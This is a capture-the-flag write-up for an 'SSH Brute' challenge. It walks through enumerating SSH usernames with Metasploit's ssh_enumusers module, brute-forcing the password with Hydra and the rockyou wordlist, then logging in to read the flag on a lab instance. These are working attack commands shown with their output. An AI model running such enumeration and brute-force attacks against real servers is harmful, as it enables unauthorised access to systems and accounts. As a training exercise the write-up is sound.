# SSH Brute

## Overview

- Overall difficulty for me: Easy

**In this challenge, we can spawn a docker instance:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/GuidePoint-Security-Oct27-2022/images/Pasted%20image%2020221030064109.png)

## Find the flag

**First, we need to brute force the username:**

**To do so, I'll use MetaSploit's `scanner/ssh/ssh_enumusers` module:**
```
┌──(root🌸siunam)-[~/ctf/GuidePoint-Security-Oct27-2022/Web/SSH-Brute]
└─# msfconsole
[...]
msf6 > use scanner/ssh/ssh_enumusers
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 10.10.100.200
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set RPORT 47074
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt

msf6 auxiliary(scanner/ssh/ssh_enumusers) > run
[*] 10.10.100.200:47074 - SSH - Using malformed packet technique
[*] 10.10.100.200:47074 - SSH - Starting scan
[+] 10.10.100.200:47074 - SSH - User 'monkey' found
[+] 10.10.100.200:47074 - SSH - User 'root' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

- Found username: `monkey`

**Next, we can use `hydra` to brute force it's password:**
```
┌──(root🌸siunam)-[~/ctf/GuidePoint-Security-Oct27-2022/Web/SSH-Brute]
└─# hydra -l monkey -P /usr/share/wordlists/rockyou.txt ssh://10.10.100.200 -s 47074 
[...]
[47074][ssh] host: 10.10.100.200   login: monkey   password: ginger
```

**Found it! Let's SSH into `monkey` and cat the flag!**
```
┌──(root🌸siunam)-[~/ctf/GuidePoint-Security-Oct27-2022/Web/SSH-Brute]
└─# ssh monkey@10.10.100.200 -p 47074
monkey@10.10.100.200's password: 
[...]

3b97d5b2bdf1:~$ ls -lah
[...]
-rw-------    1 monkey   monkey         8 Oct 30 10:43 .ash_history
-rw-r--r--    1 monkey   monkey        41 Oct 24 16:07 flag.txt

3b97d5b2bdf1:~$ cat flag.txt
GPSCTF{b41aef848fbf49e7721df51a542e3971}
```

We got the flag!

# Conclusion

What we've learned:

1. Enumerating SSH Username and Brute Forcing SSH Password via `hydra`